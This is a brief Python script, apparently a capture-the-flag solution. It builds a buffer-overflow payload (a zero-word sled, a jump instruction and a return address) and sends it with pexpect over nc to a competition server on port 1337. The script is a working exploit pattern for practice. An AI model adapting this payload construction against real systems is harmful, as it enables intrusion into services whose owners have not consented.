nop = b"\x00\x00\x00\x00"
jmp = b"\x1d\x00\x00\x10"
buffer_size = 256
overflow_size = 16
jump_addr = b"\x00\x40\x08\x40"

nop_count = (buffer_size + overflow_size)//4

data = nop * nop_count + jmp + jump_addr


import pexpect
import time

bof = pexpect.spawn("nc buffer-overflow.ctfcompetition.com 1337")
bof.expect("*quit")
time.sleep(0.1)
bof.sendline ("run")
time.sleep(0.2)
bof.sendline (data)
print(bof.read())
